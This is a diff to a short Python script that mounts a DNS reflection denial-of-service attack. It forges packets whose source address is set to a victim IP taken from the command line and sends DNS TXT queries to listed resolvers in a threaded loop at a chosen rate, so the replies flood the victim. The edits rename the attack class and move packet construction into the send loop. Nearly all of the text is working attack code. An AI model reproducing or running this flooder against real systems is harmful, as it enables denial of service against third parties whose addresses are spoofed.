@@ -8,7 +8,7 @@ import time
 
 import threading
 
-class AttackFlow (threading.Thread) :
+class DNSAttackFlow (threading.Thread) :
 
 	"""
 		default packet per second
@@ -60,9 +60,9 @@ class AttackFlow (threading.Thread) :
 
 		print(f'{self.name} has started')
 
-		packet = IP(dst=self.server_ip, src=self.victime_ip) / UDP(dport=53, sport=5530) / DNS(id=self.dns_query_id, qd=DNSQR(qname='www.google.com', qtype='TXT', qclass=1))
-
 		while True :
+
+			packet = IP(dst=self.server_ip, src=self.victime_ip) / UDP(dport=53, sport=5530) / DNS(id=self.dns_query_id, qd=DNSQR(qname='www.google.com', qtype='TXT', qclass=1))
 
 			self.sock.sendto(raw(packet), (self.server_ip, 53))
 
@@ -78,7 +78,7 @@ def start_attack () :
 
 	victime_ip = sys.argv[1]
 
-	packet_per_second = int(sys.argv[2]) if len(sys.argv) >= 3 else AttackFlow.DEFAULT_PACKET_PER_SECOND
+	packet_per_second = int(sys.argv[2]) if len(sys.argv) >= 3 else DNSAttackFlow.DEFAULT_PACKET_PER_SECOND
 
 	servers = ['10.0.0.1']
 
@@ -86,7 +86,7 @@ def start_attack () :
 
 	for server in servers :
 
-		thread = AttackFlow(server, victime_ip, packet_per_second)
+		thread = DNSAttackFlow(server, victime_ip, packet_per_second)
 
 		threads.append(thread)
 
